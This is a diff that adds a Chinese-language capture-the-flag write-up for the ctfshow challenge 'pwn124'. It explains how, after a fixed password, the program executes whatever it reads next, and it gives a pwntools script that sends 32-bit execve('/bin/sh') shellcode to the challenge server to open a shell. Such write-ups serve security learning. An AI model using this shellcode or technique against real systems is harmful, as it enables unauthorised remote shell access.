@@ -4221,6 +4221,47 @@ io.interactive()
 
 
 
+## pwn124
+
+没啥难度，静下心来慢慢看逻辑就行了
+
+main函数进去，检测一下输入
+
+输入CTFshowPWN
+
+就能进ctfshow函数
+
+ctfshow函数不反编译可能效果还好一点？
+
+ctfshow函数会执行一个call _read
+
+读取的位置是edx
+
+一看edx存的[ebp+buf]
+
+那底下的call eax里eax又存的哪
+
+巧了
+
+还是[ebp+buf]
+
+那就简单了
+
+第二次输啥执行啥
+
+写个shellcode进去就好了
+
+于是拿出祖传32位短shellcode直接写
+
+```python
+from pwn import *
+# io = process("./pwn124")
+io = remote("pwn.challenge.ctf.show",28200)
+io.sendline(b"CTFshowPWN")
+io.sendline(b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
+io.interactive()
+```
+
 # 复现平台
 
 ### ret2text
